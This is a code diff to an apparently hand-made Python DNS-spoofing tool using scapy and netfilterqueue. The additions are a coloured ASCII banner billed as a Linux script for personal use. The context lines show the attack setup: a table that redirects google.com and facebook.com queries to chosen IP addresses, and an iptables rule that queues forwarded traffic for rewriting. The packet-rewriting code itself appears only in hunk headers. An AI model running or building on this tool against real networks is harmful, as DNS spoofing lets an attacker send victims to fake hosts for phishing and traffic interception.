@@ -1,6 +1,12 @@
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
-import os
+from colorama import init, Fore
+import os, sys, random
+
+init()
+GREEN = Fore.GREEN
+RESET = Fore.RESET
+GRAY = Fore.LIGHTBLACK_EX
 
 # DNS mapping records, feel free to add/modify this dictionary
 # for example, google.com will be redirected to 192.168.1.100
@@ -9,6 +15,25 @@ dns_hosts = {
     b"google.com.": "192.168.1.100",
     b"facebook.com.": "172.217.19.142"
 }
+
+def ClownLogo():
+    clear = "\x1b[0m"
+    colors = [36, 32, 34, 35, 31, 37]
+
+    x = """
+
+                     ____  _   _______    _____                   ______
+                    / __ \/ | / / ___/   / ___/____  ____  ____  / ____/
+                   / / / /  |/ /\__ \    \__ \/ __ \/ __ \/ __ \/ /_    
+                  / /_/ / /|  /___/ /   ___/ / /_/ / /_/ / /_/ / __/    
+                 /_____/_/ |_//____/   /____/ .___/\____/\____/_/       
+                                           /_/                          
+
+        CS! DNS Spoof es un script de uso personal puede ser usado en linux.       
+    """
+    for N, line in enumerate(x.split("\n")):
+         sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
+         time.sleep(0.05)
 
 def process_packet(packet):
     """
@@ -64,6 +89,7 @@ def modify_packet(packet):
 
 
 if __name__ == "__main__":
+    ClownLogo()
     QUEUE_NUM = 0
     # insert the iptables FORWARD rule
     os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
